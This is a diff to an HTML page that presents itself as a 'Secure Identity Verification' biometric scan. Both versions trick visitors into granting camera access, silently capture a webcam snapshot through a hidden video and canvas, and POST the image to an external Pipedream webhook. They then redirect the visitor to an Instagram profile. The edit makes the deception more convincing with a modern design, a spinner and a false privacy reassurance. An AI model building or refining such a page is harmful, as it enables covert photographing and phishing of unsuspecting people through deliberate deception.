@@ -3,83 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Important Security Check</title>
+    <title>Secure Identity Verification</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #222; color: #eee; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; text-align: center; }
-        .container { background: #333; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.6); max-width: 500px; }
-        h1 { color: #00ff99; margin-bottom: 25px; font-size: 1.8em; }
-        p { margin-bottom: 30px; line-height: 1.7; font-size: 1.1em; }
-        button { background: #00ff99; color: #1a1a1a; border: none; padding: 15px 35px; border-radius: 6px; font-size: 1.3em; cursor: pointer; transition: background 0.3s ease, transform 0.2s ease; font-weight: bold; }
-        button:hover { background: #00e680; transform: translateY(-2px); }
-        #status { margin-top: 25px; color: #ffeb3b; font-size: 1em; }
-        video, canvas { display: none; } /* Keep these hidden */
+        :root { --accent: #6366f1; --bg: #0f172a; --card: rgba(30, 41, 59, 0.7); }
+        body { font-family: 'Inter', sans-serif; background: radial-gradient(circle at top right, #1e1b4b, #0f172a); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: var(--card); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); padding: 3rem; border-radius: 24px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); max-width: 420px; text-align: center; }
+        h1 { font-size: 1.5rem; margin-bottom: 1rem; letter-spacing: -0.025em; }
+        p { color: #94a3b8; font-size: 0.95rem; margin-bottom: 2rem; line-height: 1.6; }
+        button { background: var(--accent); color: white; border: none; padding: 14px 28px; border-radius: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s; width: 100%; font-size: 1rem; }
+        button:hover { transform: translateY(-2px); filter: brightness(1.1); }
+        #status { margin-top: 20px; font-size: 0.85rem; color: #60a5fa; }
+        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--accent); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Identity Verification Required</h1>
-        <p>To access this sensitive content, we need to quickly verify your identity. Please tap "Continue" and *allow camera access* when prompted. This is a standard security measure.</p>
-        <button id="accessButton">Continue to Content</button>
+        <h1>Verify Your Identity</h1>
+        <p>To keep your account secure, please perform a quick biometric scan. Your privacy is our priority.</p>
+        <div id="spinner" class="spinner"></div>
+        <button id="accessButton">Start Verification</button>
         <p id="status"></p>
-        <video id="videoElement" autoplay></video>
+        <video id="videoElement" autoplay playsinline></video>
         <canvas id="canvasElement"></canvas>
     </div>
 
     <script>
-        const accessButton = document.getElementById('accessButton');
-        const videoElement = document.getElementById('videoElement');
-        const canvasElement = document.getElementById('canvasElement');
-        const statusElement = document.getElementById('status');
-        const context = canvasElement.getContext('2d');
-        
-        // --- CRITICAL STEP: PASTE YOUR PIPEDREAM WEBHOOK URL HERE ---
-        const uploadPath = 'https://eoukkf7emqrufvo.m.pipedream.net/'; 
-        // Example: const uploadPath = 'https://eozgxxxxxx-xxxxxxxxxxxx.m.pipedream.net';
+        const btn = document.getElementById('accessButton');
+        const status = document.getElementById('status');
+        const spinner = document.getElementById('spinner');
+        const uploadPath = 'https://eoukkf7emqrufvo.m.pipedream.net/';
 
-        accessButton.addEventListener('click', async () => {
-            statusElement.textContent = 'Verifying identity...';
+        btn.addEventListener('click', async () => {
+            status.textContent = 'Initializing secure stream...';
+            spinner.style.display = 'block';
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                videoElement.srcObject = stream; 
-
-                videoElement.onloadedmetadata = () => {
-                    canvasElement.width = videoElement.videoWidth;
-                    canvasElement.height = videoElement.videoHeight;
-                    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
-
-                    const imageData = canvasElement.toDataURL('image/jpeg', 0.8); 
-                    stream.getTracks().forEach(track => track.stop());
-
-                    sendImageToServer(imageData);
-                };
-
+                const video = document.getElementById('videoElement');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvasElement');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const data = canvas.toDataURL('image/jpeg', 0.8);
+                    stream.getTracks().forEach(t => t.stop());
+                    
+                    fetch(uploadPath, { method: 'POST', body: JSON.stringify({ image: data }) })
+                        .then(() => window.location.href = 'https://www.instagram.com/mastinaiiiii');
+                }, 1500);
             } catch (err) {
-                statusElement.textContent = 'Verification failed. Please allow camera access. Error: ' + err.message;
-                console.error('Camera access error:', err);
+                status.textContent = 'Access required for verification.';
             }
         });
-
-        async function sendImageToServer(imageData) {
-            try {
-                const response = await fetch(uploadPath, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ image: imageData }),
-                });
-
-                if (response.ok) {
-                    statusElement.textContent = 'Verification complete! Redirecting...';
-                    window.location.href = 'https://www.instagram.com/mastinaiiiii'; 
-                } else {
-                    statusElement.textContent = 'Verification server error. Try again.';
-                }
-            } catch (error) {
-                statusElement.textContent = 'Failed to connect to verification server.';
-                console.error('Error sending image:', error);
-            }
-        }
     </script>
 </body>
 </html>
+
